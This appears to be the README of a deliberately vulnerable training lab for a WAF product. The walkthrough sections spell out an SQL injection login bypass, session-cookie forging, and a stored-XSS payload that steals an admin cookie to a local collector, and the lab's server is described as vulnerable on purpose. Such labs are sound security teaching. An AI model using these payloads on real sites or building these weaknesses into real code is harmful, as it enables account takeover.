# DP WAF & Load Balancer — Practical Training Lab

A hands-on lab that reproduces, **on purpose**, the real attacks DP WAF is built to stop —
matching the WAF (SQLi/XSS) and DP WAF (Load Balancing + per-IP DDoS) presentations.

> ⚠ **Vulnerable by design. Local, authorized training only.** Do not deploy publicly.

## Scenario 1 — Web attack chain (WAF)

A single connected story showing a full breach:

| Step | Page | Weakness |
|------|------|----------|
| 1 | Login (`/login.html`) | **SQL injection** — auth bypass |
| 2 | Role-based dashboard (`/dashboard`) | **Broken access control** — the `dpwaf_session` cookie carries the role and is **unsigned**, so editing it in the browser escalates a standard user to admin |
| 3 | Public feedback form (`/feedback.html`) | **Stored XSS** — input saved unsanitized |
| 4 | Admin dashboard "All Feedback" panel | Renders feedback **unescaped** → payload runs in admin's browser |
| 5 | Attacker console (`/attacker.html`) | Receives the stolen admin cookie → **account takeover** |

The dashboard shows a **standard-user sidebar** (Dashboard / Profile / Tickets / Help) or, for an
admin session, an extra **Administration** section (User Management, All Feedback, Settings, Audit
Logs). Because the cookie is client-controlled, you can flip roles yourself.

**How DP WAF fixes it:** the SQLi and XSS requests are detected and blocked at the application
layer before they ever reach the origin.

## Scenario 2 — Capacity & load balancing (Load Balancer)

Each origin serves only **2 distinct client IPs** at once. The limit is **IP-aware** (same IP
reconnecting keeps its slot). Two ways to run it:

- **`/capacity.html` — live, real-IP version.** Participants open the page from their own devices;
  their real IP claims a slot. The 3rd person sees a real HTTP 503 overload screen. This is the
  one to use for a class.
- **`/capacity-simulated.html` — single-laptop version.** A User A/B/C picker sends simulated
  `X-Forwarded-For` IPs so one machine can demonstrate the concept. (Saved from the earlier build.)

**How DP WAF fixes it:** load-balancing across multiple origins (Weighted Round Robin / Least
Conn / IP Hash) scales capacity, and per-IP DDoS control (FortiGate) drops abusive IPs.

## Running the load-balanced class demo

**Phase 1 — no load balancer (participants hit the wall).**
Run one origin and have everyone open it:
```bash
npm start                 # origin on http://localhost:6060
```
Only 2 distinct IPs get in; the 3rd+ participant sees the red overload screen with their own IP.

**Phase 2 — put a balancer in front (everyone gets back in).**
Run several identical origins on different ports, then a balancer in front of them. In separate terminals:
```bash
npm run origin1           # origin-1 on :6061
npm run origin2           # origin-2 on :6062
npm run origin3           # origin-3 on :6063
npm run lb                # balancer on :6060  ->  :6061,:6062,:6063  (IP Hash)
```
Participants reload `http://<host>:6060/capacity.html`. Now up to **6** distinct IPs get in, and
the **“Served by origin”** field shows which instance answered — proving the load is spread.

- The balancer sets `X-Forwarded-For` to each participant's real IP, so origins still count real IPs.
- Default algorithm is **IP Hash** (sticky per client). Use round-robin with `set LB_ALGO=roundrobin`
  before `npm run lb`.

**Using DP WAF as the balancer instead of `lb.js`:** skip `npm run lb`; in DP WAF, add the three
origin URLs (`http://<host>:6061`, `:6062`, `:6063`) and pick the **IP Hash** algorithm — exactly
the "we act as the load balancer, you give us your origin URLs" flow from the deck.

## Requirements
- Node.js **22+** (uses the built-in `node:sqlite`, run with `--experimental-sqlite`).

## Run
```bash
npm install
npm start
```
Then open http://localhost:6060

(If the port is busy, override it: `set PORT=9000 && npm start` on Windows.)

## Walkthrough

### Privilege escalation by editing your own cookie (broken access control)
1. On `/login.html`, sign in as the standard user `guest` / `guest`. You land on `/dashboard`
   with the **standard-user sidebar** — no admin panels.
2. Open **DevTools → Application → Cookies → this site**. The dashboard even prints the admin
   cookie value for you (click to copy).
3. Replace the `dpwaf_session` cookie value with the admin one and **reload** `/dashboard`.
4. The page flips to the **admin dashboard**: the Administration sidebar section, User Management,
   and All Feedback panels all appear. You escalated yourself with a cookie edit — because the
   server trusts the unsigned cookie.

### Steal the admin's session via stored XSS
1. Open `/attacker.html` in one tab (leave it running).
2. On `/feedback.html`, click a payload chip to fill the message, e.g.
   `<script>new Image().src='/api/collect?c='+encodeURIComponent(document.cookie)</script>`, and **Submit**.
3. Log in as admin (or forge the cookie as above) and open `/dashboard`. The admin-only "All
   Feedback" panel renders the poisoned message — the payload fires in *your* browser.
4. Switch to `/attacker.html`: the admin's `dpwaf_session` cookie appears in the captured beacons.
   Click it, then **Replay as admin** — the server confirms the cookie authenticates as admin.
   Full account takeover from one form submission.

### SQL injection (login bypass)
- On `/login.html`, put `admin' --` (or `' OR 1=1 --`) in **username**, any/blank password, sign in.
- You're authenticated as admin without knowing the password. The response shows the raw
  `executedSql` so you can see how the input rewrote the query.

### Scenario 2 — capacity & load balancing
See **“Running the load-balanced class demo”** above for the real-IP, multi-origin flow.
For a quick single-laptop concept demo, open `/capacity-simulated.html` and use the User A/B/C
picker: A + B fill the 2 slots, C gets **503**, A again reuses its slot (IP-aware).

## Project layout
```
server.js   Express app: login (SQLi), feedback sink, role-based /dashboard (XSS + broken
            access control), attacker collector, cookie replay, IP-aware capacity endpoints
lb.js       zero-dependency load balancer (IP Hash / round-robin) for the multi-origin demo
db.js       in-memory SQLite users table for the SQLi demo
public/     index / feedback / login / attacker / capacity + styles + app.js
```

## API reference
| Method | Path | Purpose |
|--------|------|---------|
| POST | `/api/login` | Vulnerable login (SQLi); sets unsigned base64 `dpwaf_session` cookie |
| GET | `/dashboard` (`/admin`) | Role-based dashboard; admin panels render feedback unescaped |
| POST | `/api/feedback` | Public, unsanitized feedback sink (stored XSS) |
| GET | `/api/collect?c=` | Attacker beacon; stores exfiltrated data, returns 1×1 GIF |
| GET | `/api/collect/list` | Captured beacons (attacker console) |
| POST | `/api/replay` | Replay a stolen cookie → decodes role, proves takeover |
| POST | `/api/room/enter` | Take a slot (IP-aware); 503 when 2 distinct IPs are active |
| POST | `/api/room/leave` | Free the caller's IP slot |
| GET | `/api/room/status` | `{active:[ip…], max}` |

*Note:* the session cookie is intentionally **not** `HttpOnly` so the XSS can read it. In the real
world `HttpOnly` is a partial mitigation — but DP WAF blocks the payload outright, before it lands.
